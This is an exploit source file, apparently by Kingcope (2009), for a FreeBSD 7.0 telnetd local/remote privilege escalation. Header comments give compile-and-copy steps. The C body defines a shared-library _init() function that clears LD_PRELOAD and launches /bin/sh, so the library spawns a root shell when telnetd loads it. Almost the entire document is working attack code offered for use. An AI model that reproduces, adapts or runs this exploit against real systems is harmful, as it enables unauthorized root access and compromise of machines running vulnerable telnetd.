# FreeBSD telnetd local/remote privilege escalation/code execution
# remote root only when accessible ftp or similar available
# tested on FreeBSD 7.0-RELEASE
# by Kingcope/2009
#
#gcc -o program.o -c program.c -fPIC
#gcc -shared -Wl,-soname,libno_ex.so.1 -o libno_ex.so.1.0 program.o -nostartfiles
#./program.o
#cp libno_ex.so.1.0 /tmp/libno_ex.so.1.0
#./tmp/libno_ex.so.1.0

#include <unistd.h>
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
        FILE *f;
        setenv("LD_PRELOAD", "", 1);
        system("echo ALEX-ALEX;/bin/sh");
}